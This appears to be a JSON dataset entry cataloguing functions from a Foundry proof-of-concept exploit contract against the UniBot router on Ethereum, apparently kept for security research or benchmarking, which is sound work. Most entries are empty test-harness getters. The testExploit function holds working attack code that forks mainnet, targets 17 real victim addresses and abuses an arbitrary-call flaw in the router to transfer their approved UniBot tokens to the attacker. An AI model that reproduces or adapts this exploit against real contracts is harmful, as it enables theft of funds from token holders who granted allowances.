[
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"https://rpc.ankr.com/eth\", 18_467_805);\n\n        cheats.label(address(router), \"UniBotRouter\");\n        cheats.label(address(UniBot), \"UniBot Token\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniBotRouterExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"Attacker UniBot balance before exploit\", UniBot.balanceOf(address(this)), UniBot.decimals()\n        );\n\n        address[] memory victims = new address[](17);\n\n        victims[0] = 0xA20Cb17D888b7E426A3a7Ca2E583706dE48a04f3;\n        victims[1] = 0x9a74A98Df43c085D89c6311746fe5C9D989982e5;\n        victims[2] = 0x2004DE74c1c41A6943f364508f2e1a2390D0C9f9;\n        victims[3] = 0x7cf45fc309E45bFF39178f475e6A8B2A7d34B664;\n        victims[4] = 0x69B0E938172b4ed5d8184420b202B8277AbACEad;\n        victims[5] = 0x111bA89bd55e6d88e0CD1E193601E3a612FA703D;\n        victims[6] = 0xB03b67cBae72c26CB262e5299a7FBC44A3f9D60A;\n        victims[7] = 0xA6C9dA49553bcfec4633F4a0B81FBb4255F590fB;\n        victims[8] = 0xEEE050e1C0644364Ba53872f096Ba4F8088eA22F;\n        victims[9] = 0x4E19e37187Ca00F8eD8B6Ad258c6CaD823AA67b4;\n        victims[10] = 0xde6E807908B7cB01aA19402fd022c20f1B02AA9d;\n        victims[11] = 0x0d2FC413c1bEEB51f0c91a851Cb27421bccC75aC;\n        victims[12] = 0x97508F07D974FB02B79bf26bBa7bCE96E0e0985A;\n        victims[13] = 0x8523e886556CF1Bb539afF13d339cb1f3F9ecB25;\n        victims[14] = 0xEba8364c737c6C58c89C9907567eCd5265f08ac2;\n        victims[15] = 0x8a1Ee663e8Cd3F967D1814657A8858246ED31444;\n        victims[16] = 0x92c3717A1318cf0e02883Ca0BAE73bd90469325A;\n\n        bytes4 vulnFunctionSignature = hex\"b2bd16ab\";\n        address[] memory first_param = new address[](4);\n        first_param[0] = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n        first_param[1] = address(UniBot);\n        first_param[2] = address(UniBot);\n        first_param[3] = address(UniBot);\n        for (uint256 i = 0; i < victims.length; i++) {\n            uint256 allowance = UniBot.allowance(victims[i], address(router));\n            uint256 balance = UniBot.balanceOf(victims[i]);\n            balance = allowance < balance ? allowance : balance;\n            bytes memory transferFromData =\n                abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", victims[i], address(this), balance);\n            bytes memory data = abi.encodeWithSelector(\n                vulnFunctionSignature, first_param, 0, true, 100_000, transferFromData, new address[](1)\n            );\n            (bool success, bytes memory result) = address(router).call(data);\n        }\n        uint256 UniBotBalance = UniBot.balanceOf(address(this));\n        emit log_named_decimal_uint(\"Attacker UniBot balance after exploit\", UniBotBalance, UniBot.decimals());\n    }\n",
    "description": ""
  }
]